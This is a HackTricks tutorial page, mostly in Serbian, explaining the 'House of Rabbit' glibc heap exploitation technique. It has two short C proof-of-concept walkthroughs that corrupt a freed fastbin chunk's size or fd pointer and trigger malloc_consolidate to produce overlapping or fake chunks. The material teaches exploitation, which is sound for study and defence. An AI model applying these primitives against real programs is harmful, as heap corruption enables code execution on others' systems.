# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Requirements

1. **Sposobnost modifikacije fast bin fd pokazivača ili veličine**: To znači da možete promeniti pokazivač napred na delu u fastbinu ili njegovu veličinu.
2. **Sposobnost da pokrenete `malloc_consolidate`**: To se može uraditi ili alokacijom velikog dela ili spajanjem gornjeg dela, što prisiljava heap da konsoliduje delove.

### Goals

1. **Kreirati preklapajuće delove**: Da jedan deo preklapa drugi, omogućavajući dalju manipulaciju heap-om.
2. **Falsifikovati lažne delove**: Da prevarite alokator da tretira lažni deo kao legitimni deo tokom operacija na heap-u.

## Steps of the attack

### POC 1: Modifikujte veličinu fast bin dela

**Cilj**: Kreirati preklapajući deo manipulacijom veličine fastbin dela.

* **Korak 1: Alocirajte delove**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Dodeljujemo dva dela od po 0x40 bajta. Ovi delovi će biti smešteni u brzi bin list nakon što budu oslobođeni.

* **Step 2: Free Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Osoba oslobađa oba dela, dodajući ih na fastbin listu.

* **Korak 3: Izmeni Veličinu Dela**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Menjamo veličinu metapodataka `chunk1` na 0xa1. Ovo je ključni korak da prevarimo alokator tokom konsolidacije.

* **Korak 4: Aktiviraj `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Allociranje velikog dela aktivira funkciju `malloc_consolidate`, spajajući male delove u brzi bin. Manipulisana veličina `chunk1` uzrokuje da se preklapa sa `chunk2`.

Nakon konsolidacije, `chunk1` se preklapa sa `chunk2`, omogućavajući dalju eksploataciju.

### POC 2: Izmeniti `fd` pokazivač

**Cilj**: Kreirati lažni deo manipulacijom `fd` pokazivača brzog bina.

* **Korak 1: Alocirajte delove**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Objašnjenje**: Alociramo dva dela, jedan manji i jedan veći, da postavimo heap za lažni deo.

* **Korak 2: Kreiraj lažni deo**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Pišemo lažne metapodatke o delu u `chunk2` da simuliramo manje delove.

* **Korak 3: Oslobodi `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Objašnjenje**: Oslobađamo `chunk1`, dodajući ga na fastbin listu.

* **Korak 4: Izmenite `fd` od `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Objašnjenje**: Menjamo prednji pokazivač (`fd`) `chunk1` da pokazuje na naš lažni chunk unutar `chunk2`.

* **Korak 5: Aktiviraj `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Allociranje velikog dela ponovo pokreće `malloc_consolidate`, koji obrađuje lažni deo.

Lažni deo postaje deo fastbin liste, čineći ga legitimnim delom za dalju eksploataciju.

### Rezime

Tehnika **House of Rabbit** uključuje ili modifikovanje veličine fast bin dela kako bi se stvorili preklapajući delovi ili manipulaciju `fd` pokazivačem za kreiranje lažnih delova. Ovo omogućava napadačima da falsifikuju legitimne delove u heap-u, omogućavajući različite oblike eksploatacije. Razumevanje i vežbanje ovih koraka poboljšaće vaše veštine eksploatacije heap-a.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
